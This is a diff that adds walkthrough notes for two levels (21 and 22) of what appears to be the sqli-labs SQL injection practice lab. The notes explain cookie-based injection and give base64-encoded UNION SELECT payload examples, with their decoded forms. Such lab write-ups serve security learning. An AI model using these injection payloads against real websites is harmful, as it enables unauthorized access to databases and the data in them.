@@ -131,3 +131,22 @@ form the soruce cose we can see that there it's is fecting data from database us
 payload
 
 ![image](https://user-images.githubusercontent.com/61080375/110950149-7b65b580-8369-11eb-8abd-8306165ba3da.png)
+
+less-21
+=======
+
+In this we have to base 64 encode our payload and set it as cookiee
+payload example:
+YWRtaW5uJyl1bmlvbiBzZWxlY3QgMSwyLDMj : adminn')union select 1,2,3# 
+
+less-22
+=======
+
+This is also cookiee based injection where cookie is base64 encoded 
+here " was used in the query
+
+payload example
+
+YWRtaW5uIiB1bmlvbiBzZWxlY3QgMSwyLDMj :  adminn" union select 1,2,3#
+
+
